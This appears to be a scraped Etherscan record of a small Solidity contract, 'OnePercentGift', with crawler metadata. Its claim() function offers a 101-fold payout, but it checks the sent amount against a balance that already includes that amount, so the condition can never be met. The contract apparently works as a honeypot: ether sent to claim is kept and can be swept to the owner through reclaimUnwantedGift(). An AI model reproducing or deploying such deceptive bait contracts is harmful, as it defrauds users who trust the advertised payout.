//token_name	
//token_url	https://etherscan.io//address/0x094a7d5a89b4215334f2658841986ea3702ae615#code
//spider_time	2018/07/08 12:04:54
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{

	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value * 101);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}